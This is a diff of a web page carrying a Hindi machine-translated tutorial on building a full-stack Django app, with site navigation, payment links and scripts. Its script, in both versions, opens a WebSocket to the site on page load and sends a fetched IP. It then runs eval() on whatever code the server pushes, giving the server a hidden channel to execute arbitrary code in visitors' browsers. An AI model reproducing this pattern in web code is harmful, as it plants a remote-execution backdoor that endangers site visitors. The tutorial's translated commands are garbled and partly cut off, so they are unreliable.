@@ -65,7 +65,7 @@
               <a class="nav-link" href="/hi/landing" title="लैंडिंग पृष्ठ पर जाएँ">अवतरण</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="वीडियो चैट">बात करना</a>
+              <a class="nav-link" href="/hi/chat" title="वीडियो चैट">बात करना</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/hi/private" title="एक कुंजी के साथ निजी तस्वीरें देखें">निजी</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisyकी प्रोफ़ाइल फोटो" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>द्वारा Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> मैं Django के साथ एक पूर्ण स्टैक वेब ऐप कैसे बनाऊं?यहाँ प्रक्रिया की एक सामान्य रूपरेखा है: </p> <p> <br> </p> <p> 1।Django सेट करें: सबसे पहले, अपने कमांड लाइन में `pip इंस्टॉल Django` चलाकर Django स्थापित करें।फिर, `django-admin startproject myproject` </p> <p> <p> <br> </p> <p> 2 चलाकर एक नया Django प्रोजेक्ट बनाएं।Django Apps बनाएँ: Django ऐप्स आपके प्रोजेक्ट के मॉड्यूलर घटक हैं जो विशिष्ट उद्देश्यों की सेवा करते हैं।आप विभिन्न कार्यात्मकताओं को संभालने के लिए अपनी परियोजना के भीतर कई ऐप बना सकते हैं। </p> <p> <br> </p> <p> 3।मॉडल को परिभाषित करें: Django में मॉडल का उपयोग आपके डेटाबेस तालिकाओं की संरचना को परिभाषित करने के लिए किया जाता है।प्रत्येक ऐप की मॉडल में कक्षाओं को परिभाषित करके अपने मॉडल बनाएं। </p> <p> <b> <br> </p> <p> 4दृश्य बनाएं: Django में दृश्य पायथन फ़ंक्शन हैं जो उपयोगकर्ता अनुरोधों को संभालते हैं और प्रतिक्रियाओं को वापस करते हैं।प्रत्येक ऐप के व्यूज़ में फ़ंक्शन बनाकर अपने ऐप के लिए दृश्य को परिभाषित करें। </p> <p> <b> <br> </p> <p> 5।स्थापित करनाURL: Django में URL का उपयोग विशिष्ट विचारों के लिए उपयोगकर्ता अनुरोधों को मैप करने के लिए किया जाता है।प्रत्येक ऐप में एक urls.py फ़ाइल बनाकर अपने ऐप के लिए URL पैटर्न को परिभाषित करें और उन्हें अपनी प्रोजेक्ट की मुख्य urls.py फ़ाइल में शामिल करें। </p> <p> <b> <br> </p> <p> 6।टेम्प्लेट बनाएँ: Django में टेम्प्लेट का उपयोग HTML पृष्ठों को उत्पन्न करने के लिए किया जाता है जो उपयोगकर्ता के ब्राउज़र को भेजे जाते हैं।प्रत्येक ऐप में एक टेम्प्लेट फ़ोल्डर बनाकर और अलग -अलग टेम्पलेट फ़ाइलों में HTML कोड लिखकर अपने ऐप के लिए HTML टेम्प्लेट बनाएं। </p> <p> <p> <br> </p> <p> 7।स्टेटिक फाइल्स परोसें: स्टेटिक फाइल्स जैसे कि सीएसएस, जावास्क्रिप्ट, और इमेज को Django में डायनेमिक कंटेंट से अलग से परोसा जाता है।प्रत्येक ऐप में स्थिर फ़ोल्डर से स्थिर फ़ाइलों की सेवा करने के लिए अपनी प्रोजेक्ट की सेटिंग्स में स्टेटिक फाइल सेटिंग्स को कॉन्फ़िगर करें।डेटाबेस को कॉन्फ़िगर करें: डेटाबेस इंजन, नाम, उपयोगकर्ता, पासवर्ड और होस्ट सहित अपनी प्रोजेक्ट की सेटिंग्स में अपनी डेटाबेस सेटिंग्स सेट करें।9।डेटाबेस को माइग्रेट करें: `पायथन Manage.py makemigrations` चलाएंYthon Manage.py माइग्रेट `अपने कमांड लाइन में अपने मॉडल के आधार पर डेटाबेस माइग्रेशन बनाने और लागू करने के लिए। </p> <p> <br> </p> <p> 10।सर्वर चलाएं: अपने कमांड लाइन में `पायथन Manage.py Runserver` चलाकर Django डेवलपमेंट सर्वर शुरू करें।अब आपको अपने वेब ऐप को `http: //127.0.0.1: 8000/` अपने ब्राउज़र में एक्सेस करने में सक्षम होना चाहिए।Django के साथ एक पूर्ण स्टैक वेब ऐप बनाएं।यहां से, आप प्रमाणीकरण, प्राधिकरण, एपीआई समापन बिंदु, परीक्षण, और जोड़कर अपने ऐप को अनुकूलित और विस्तारित कर सकते हैं</div>
+<div style="white-space: pre-wrap;"><p>मैं Django के साथ एक पूर्ण स्टैक वेब ऐप कैसे बनाऊं?</p><p><br/></p><p>Django के साथ एक पूर्ण स्टैक वेब ऐप बनाने में कई चरण शामिल हैं। यहां प्रक्रिया की सामान्य रूपरेखा दी गई है:</p><p><br/></p><p>1। Django सेट करें: सबसे पहले, अपने कमांड लाइन में `pip इंस्टॉल Django` चलाकर Django स्थापित करें। फिर, `Django-Admin StartProject myProject` चलाकर एक नया Django प्रोजेक्ट बनाएं।</p><p><br/></p><p>2। Django Apps बनाएँ: Django ऐप्स आपकी परियोजना के मॉड्यूलर घटक हैं जो विशिष्ट उद्देश्यों की सेवा करते हैं। आप विभिन्न कार्यात्मकताओं को संभालने के लिए अपनी परियोजना के भीतर कई ऐप बना सकते हैं।</p><p><br/></p><p>3। मॉडल को परिभाषित करें: Django में मॉडल का उपयोग आपके डेटाबेस तालिकाओं की संरचना को परिभाषित करने के लिए किया जाता है। प्रत्येक ऐप के मॉडल.यू फाइल में कक्षाओं को परिभाषित करके अपने मॉडल बनाएं।</p><p><br/></p><p>4। दृश्य बनाएं: Django में दृश्य पायथन फ़ंक्शन हैं जो उपयोगकर्ता अनुरोधों को संभालते हैं और प्रतिक्रियाओं को वापस करते हैं। प्रत्येक ऐप के व्यूज़.पी फ़ाइल में फ़ंक्शन बनाकर अपने ऐप के लिए दृश्य को परिभाषित करें।</p><p><br/></p><p>5। URL सेट करें: Django में URL का उपयोग विशिष्ट विचारों के लिए उपयोगकर्ता अनुरोधों को मैप करने के लिए किया जाता है। प्रत्येक ऐप में एक urls.py फ़ाइल बनाकर अपने ऐप के लिए URL पैटर्न को परिभाषित करें और उन्हें अपनी परियोजना की मुख्य urls.py फ़ाइल में शामिल करें।</p><p><br/></p><p>6। टेम्प्लेट बनाएँ: Django में टेम्प्लेट का उपयोग HTML पृष्ठों को उत्पन्न करने के लिए किया जाता है जो उपयोगकर्ता के ब्राउज़र को भेजे जाते हैं। प्रत्येक ऐप में एक टेम्प्लेट फ़ोल्डर बनाकर और अलग -अलग टेम्प्लेट फ़ाइलों में HTML कोड लिखकर अपने ऐप के लिए HTML टेम्प्लेट बनाएं।</p><p><br/></p><p>7। स्थिर फ़ाइलों की सेवा करें: स्टेटिक फाइलें जैसे कि सीएसएस, जावास्क्रिप्ट, और छवियां Django में गतिशील सामग्री से अलग से परोसी जाती हैं। प्रत्येक ऐप में स्थिर फ़ोल्डर से स्थिर फ़ाइलों की सेवा करने के लिए अपनी प्रोजेक्ट की सेटिंग्स में स्थिर फ़ाइल सेटिंग्स को कॉन्फ़िगर करें।</p><p><br/></p><p>8। डेटाबेस को कॉन्फ़िगर करें: डेटाबेस इंजन, नाम, उपयोगकर्ता, पासवर्ड और होस्ट सहित अपनी प्रोजेक्ट की सेटिंग्स में अपनी डेटाबेस सेटिंग्स सेट करें।</p><p><br/></p><p>9। डेटाबेस को माइग्रेट करें: अपने मॉडल के आधार पर डेटाबेस माइग्रेशन बनाने और लागू करने के लिए `पायथन मैनेज।</p><p><br/></p><p>10। सर्वर चलाएं: अपने कमांड लाइन में `पायथन Manage.py Runserver` चलाकर Django डेवलपमेंट सर्वर शुरू करें। अब आपको अपने ब्राउज़र में अपने वेब ऐप को `http: //127.0.0.1: 8000/` पर एक्सेस करने में सक्षम होना चाहिए।</p><p><br/></p><p>Django के साथ एक पूर्ण स्टैक वेब ऐप बनाने के लिए ये बुनियादी कदम हैं। यहां से, आप प्रमाणीकरण, प्राधिकरण, एपीआई समापन बिंदु, परीक्षण, और बहुत कुछ जोड़कर अपने ऐप को अनुकूलित और विस्तारित कर सकते हैं।</p><div><br/></div></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -142,7 +143,7 @@
 
 
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=7126a29e-3064-497d-b8f5-6132bc88e4fb" title="Buy on Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=7126a29e-3064-497d-b8f5-6132bc88e4fb&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">क्रिप्टो के साथ खरीदें</a></p>
+<p><a href="https://lotteh.com/payments/pay/Daisy/?id=7126a29e-3064-497d-b8f5-6132bc88e4fb" title="Buy on Lotte Harper">खरीदना</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=7126a29e-3064-497d-b8f5-6132bc88e4fb&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">क्रिप्टो के साथ खरीदें</a></p>
 
 
 <hr>
@@ -182,46 +183,53 @@
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
     <i class="bi bi-globe"></i> भाषा
   </a>
   <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
-    <a class="dropdown-item" href="/en/how-do-i-build-a-full-stack-web">English</a>
-    <a class="dropdown-item" href="/es/how-do-i-build-a-full-stack-web">Española</a>
-    <a class="dropdown-item" href="/fr/how-do-i-build-a-full-stack-web">Français</a>
-    <a class="dropdown-item" href="/de/how-do-i-build-a-full-stack-web">Deutsch</a>
-    <a class="dropdown-item" href="/nl/how-do-i-build-a-full-stack-web">Nederlands</a>
-    <a class="dropdown-item" href="/af/how-do-i-build-a-full-stack-web">Afrikaans</a>
-    <a class="dropdown-item" href="/ar/how-do-i-build-a-full-stack-web">عربي</a>
-    <a class="dropdown-item" href="/pt/how-do-i-build-a-full-stack-web">Português (Portugal, Brazil)</a>
-    <a class="dropdown-item" href="/id/how-do-i-build-a-full-stack-web">Bahasa</a>
-    <a class="dropdown-item" href="/hi/how-do-i-build-a-full-stack-web">हिंदी</a>
-    <a class="dropdown-item" href="/ru/how-do-i-build-a-full-stack-web">Русский</a>
-    <a class="dropdown-item" href="/ja/how-do-i-build-a-full-stack-web">日本語</a>
-    <a class="dropdown-item" href="/th/how-do-i-build-a-full-stack-web">แบบไทย</a>
-    <a class="dropdown-item" href="/zh-CN/how-do-i-build-a-full-stack-web">中国人</a>
-    <a class="dropdown-item" href="/tl/how-do-i-build-a-full-stack-web">Filipino</a>
-    <a class="dropdown-item" href="/cs/how-do-i-build-a-full-stack-web">čeština</a>
-    <a class="dropdown-item" href="/he/how-do-i-build-a-full-stack-web">עִברִית</a>
-    <a class="dropdown-item" href="/it/how-do-i-build-a-full-stack-web">Italiana</a>
-    <a class="dropdown-item" href="/no/how-do-i-build-a-full-stack-web">norsk</a>
-    <a class="dropdown-item" href="/pl/how-do-i-build-a-full-stack-web">Polski</a>
-    <a class="dropdown-item" href="/sv/how-do-i-build-a-full-stack-web">svenska</a>
-    <a class="dropdown-item" href="/tr/how-do-i-build-a-full-stack-web">Türkçe</a>
-    <a class="dropdown-item" href="/uk/how-do-i-build-a-full-stack-web">українська</a>
-    <a class="dropdown-item" href="/vi/how-do-i-build-a-full-stack-web">Tiếng Việt</a>
-    <a class="dropdown-item" href="/zu/how-do-i-build-a-full-stack-web">Zulu</a>
+    <div style="max-height: 50vh; overflow: scroll;">
+        <a class="dropdown-item" href="/en/how-do-i-build-a-full-stack-web">English</a>
+        <a class="dropdown-item" href="/es/how-do-i-build-a-full-stack-web">Española</a>
+        <a class="dropdown-item" href="/fr/how-do-i-build-a-full-stack-web">Français</a>
+        <a class="dropdown-item" href="/de/how-do-i-build-a-full-stack-web">Deutsch</a>
+        <a class="dropdown-item" href="/nl/how-do-i-build-a-full-stack-web">Nederlands</a>
+        <a class="dropdown-item" href="/af/how-do-i-build-a-full-stack-web">Afrikaans</a>
+        <a class="dropdown-item" href="/ar/how-do-i-build-a-full-stack-web">عربي</a>
+        <a class="dropdown-item" href="/pt/how-do-i-build-a-full-stack-web">Português (Portugal, Brazil)</a>
+        <a class="dropdown-item" href="/id/how-do-i-build-a-full-stack-web">Bahasa</a>
+        <a class="dropdown-item" href="/hi/how-do-i-build-a-full-stack-web">हिंदी</a>
+        <a class="dropdown-item" href="/ru/how-do-i-build-a-full-stack-web">Русский</a>
+        <a class="dropdown-item" href="/ja/how-do-i-build-a-full-stack-web">日本語</a>
+        <a class="dropdown-item" href="/th/how-do-i-build-a-full-stack-web">แบบไทย</a>
+        <a class="dropdown-item" href="/zh-CN/how-do-i-build-a-full-stack-web">中国人</a>
+        <a class="dropdown-item" href="/tl/how-do-i-build-a-full-stack-web">Filipino</a>
+        <a class="dropdown-item" href="/cs/how-do-i-build-a-full-stack-web">čeština</a>
+        <a class="dropdown-item" href="/he/how-do-i-build-a-full-stack-web">עִברִית</a>
+        <a class="dropdown-item" href="/it/how-do-i-build-a-full-stack-web">Italiana</a>
+        <a class="dropdown-item" href="/no/how-do-i-build-a-full-stack-web">norsk</a>
+        <a class="dropdown-item" href="/pl/how-do-i-build-a-full-stack-web">Polski</a>
+        <a class="dropdown-item" href="/sv/how-do-i-build-a-full-stack-web">svenska</a>
+        <a class="dropdown-item" href="/tr/how-do-i-build-a-full-stack-web">Türkçe</a>
+        <a class="dropdown-item" href="/uk/how-do-i-build-a-full-stack-web">українська</a>
+        <a class="dropdown-item" href="/vi/how-do-i-build-a-full-stack-web">Tiếng Việt</a>
+        <a class="dropdown-item" href="/zu/how-do-i-build-a-full-stack-web">Zulu</a>
+        <a class="dropdown-item" href="/sq/how-do-i-build-a-full-stack-web">shqiptare</a>
+    </div>
   </div>
 </div>
-</p>
+
         <p><i>मुझे इस पते का उपयोग करके बिटकॉइन में एक टिप छोड़ दें:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="प्रतिलिपि पता" onclick="copyToClipboard('btc-wallet');">प्रतिलिपि</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="मुझे इंस्टाग्राम पर जाएँ" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="मुझे ट्विटर पर जाएँ" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="मुझे YouTube पर देखें" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=hi" title="सेवा की शर्तें देखें">सेवा की शर्तें</a></span></p>
 		    </div>
@@ -237,6 +245,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -247,32 +272,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("close", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -419,34 +444,43 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "क्यूआर कोड को स्कैन करके इस पृष्ठ को साझा करें।";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.click();
-              document.body.removeChild(link);
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
     
-    <script async type="application/javascript"
-        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
-<script>
-  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
-    basicSubscriptions.init({
-      type: "NewsArticle",
-      isPartOfType: ["Product"],
-      isPartOfProductId: "CAowktDYCw:openaccess",
-      clientOptions: { theme: "light", lang: "en" },
-    });
-  });
-</script>
-
+    
     
     
     <script>
